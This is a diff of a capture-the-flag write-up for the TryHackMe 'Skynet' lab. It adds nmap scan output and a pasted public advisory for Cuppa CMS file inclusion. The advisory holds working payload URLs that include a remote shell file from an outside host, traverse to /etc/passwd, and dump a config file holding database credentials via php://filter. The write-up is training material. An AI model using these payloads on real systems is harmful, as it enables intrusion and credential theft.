@@ -1,6 +1,73 @@
 
 ![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-1.png)
 
+```text
+# Nmap 7.80 scan initiated Sun Nov 22 05:54:38 2020 as: nmap -sS -T4 -oN nmap1.txt 10.10.150.216
+Nmap scan report for 10.10.150.216
+Host is up (0.069s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+
+# Nmap done at Sun Nov 22 05:54:41 2020 -- 1 IP address (1 host up) scanned in 3.37 seconds
+```
+The more detailed scan.
+```text
+# Nmap 7.80 scan initiated Sun Nov 22 05:55:05 2020 as: nmap -sV -sC -p22,80,110,139,143,445 -oN nmap2.txt 10.10.150.216
+Nmap scan report for 10.10.150.216
+Host is up (0.062s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: PIPELINING CAPA RESP-CODES SASL UIDL AUTH-RESP-CODE TOP
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: listed SASL-IR IDLE IMAP4rev1 LOGINDISABLEDA0001 capabilities post-login ENABLE have more Pre-login ID LOGIN-REFERRALS OK LITERAL+
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h59m36s, deviation: 3h27m50s, median: -23s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2020-11-22T04:54:57-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-11-22T10:54:57
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Nov 22 05:55:23 2020 -- 1 IP address (1 host up) scanned in 18.13 seconds
+
+```
+
+
+
 Http service on port 80 reveals a page with a search which does nothing.
 ![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-2.png)
 
@@ -43,8 +110,8 @@ squirrelmail            [Status: 301, Size: 321, Words: 20, Lines: 10]
 :: Progress: [4615/4615] :: Job [1/1] :: 384 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
 ```
 
-The /squirrelmail has a login form.
-![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-3.png)
+The /squirrelmail has a login form.  
+![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-3.png)  
 I didn't knew any username or password, but i had plenty of services to enumerate. The smb share has a folder which can be read by anyone.
 ![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-4.png)
 
@@ -130,6 +197,96 @@ index.html              [Status: 200, Size: 418, Words: 45, Lines: 16]
 
 I tried the found credentials, but no luck. I looked for an exploit for this cms and i found it.
 ![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-13.png)
+
+```text
+# Exploit Title   : Cuppa CMS File Inclusion
+# Date            : 4 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://www.cuppacms.com/
+# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
+# Version         : Beta
+# Tested on       : Window and Linux
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /          
+  / XXXXXX /
+ (________(            
+  `------'
+
+####################################
+VULNERABILITY: PHP CODE INJECTION
+####################################
+
+/alerts/alertConfigField.php (LINE: 22)
+
+-----------------------------------------------------------------------------
+LINE 22: 
+        <?php include($_REQUEST["urlConfig"]); ?>
+-----------------------------------------------------------------------------
+    
+
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php source code via PHPStream 
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+-----------------------------------------------------------------------------
+
+Base64 Encode Output:
+-----------------------------------------------------------------------------
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+-----------------------------------------------------------------------------
+
+Base64 Decode Output:
+-----------------------------------------------------------------------------
+<?php 
+	class Configuration{
+		public $host = "localhost";
+		public $db = "cuppa";
+		public $user = "root";
+		public $password = "Db@dmin";
+		public $table_prefix = "cu_";
+		public $administrator_template = "default";
+		public $list_limit = 25;
+		public $token = "OBqIPqlFWf3X";
+		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+		public $upload_default_path = "media/uploadsFiles";
+		public $maximum_file_size = "5242880";
+		public $secure_login = 0;
+		public $secure_login_value = "";
+		public $secure_login_redirect = "";
+	} 
+?>
+-----------------------------------------------------------------------------
+
+Able to read sensitive information via File Inclusion (PHP Stream)
+
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
+################################################################################################################
+```
 
 I copied the exploit to my folder and read it carefully. Turns out, this cms is vulnerable to LFI and RFI.
 ```text
